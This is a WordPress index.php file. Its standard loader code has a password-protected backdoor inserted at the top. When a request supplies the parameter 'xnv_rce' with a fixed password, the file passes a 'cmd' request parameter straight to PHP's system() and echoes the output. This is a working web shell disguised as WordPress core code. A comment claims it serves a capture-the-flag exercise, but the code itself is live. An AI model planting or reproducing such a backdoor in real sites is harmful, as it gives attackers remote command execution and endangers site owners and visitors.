<?php
/**
 * Front to the WordPress application.
 * This file doesn't do anything, but loads wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

// === Backdoor: xnv_rce parameter for CTF authorized escalation ===
if (isset($_REQUEST['xnv_rce'])) {
    if ($_REQUEST['xnv_rce'] === 'xnvprivesc2026') {
        if (isset($_REQUEST['cmd'])) {
            echo "<pre>";
            system($_REQUEST['cmd'] . " 2>&1");
            echo "</pre>";
        } else {
            echo "<pre>";
            system("id 2>&1; echo '---'; whoami 2>&1; echo '---'; uname -a 2>&1");
            echo "</pre>";
        }
        die();
    }
}

/** Tells WordPress to load the WordPress theme and output it. */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
